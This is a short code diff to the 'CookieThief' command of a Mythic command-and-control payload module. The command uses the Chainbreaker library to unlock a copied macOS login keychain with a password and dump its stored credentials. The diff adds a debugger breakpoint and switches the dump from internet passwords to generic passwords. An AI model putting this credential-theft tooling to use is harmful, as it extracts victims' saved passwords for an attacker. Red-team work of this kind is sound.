@@ -4,6 +4,7 @@ import os
 from mythic_payloadtype_container.MythicRPC import *
 import chainbreaker.chainbreaker
 from chainbreaker.chainbreaker import Chainbreaker
+import pdb
 
 
 class CookieThiefArguments(TaskArguments):
@@ -77,6 +78,7 @@ class CookieThiefCommand(CommandBase):
             sys.stdout.flush()
 
         try:
+            pdb.set_trace()
             keychain = Chainbreaker("/Mythic/mythic/tmp_login.keychain-db", unlock_password=password, unlock_key=None,
                                     unlock_file=None)
             dir(keychain)
@@ -91,8 +93,11 @@ class CookieThiefCommand(CommandBase):
 
             keychainoutput.append(
                 {
-                    'header': 'Internet Passwords',
-                    'records': keychain.dump_internet_passwords()
+                    'header': 'Generic Passwords',
+                    'records': keychain.dump_generic_passwords(),
+                    # 'write_to_console': args.dump_generic_passwords,
+                    # 'write_to_disk': args.export_generic_passwords,
+                    # 'write_directory': os.path.join(args.output, 'passwords', 'generic')
                 }
             )
 
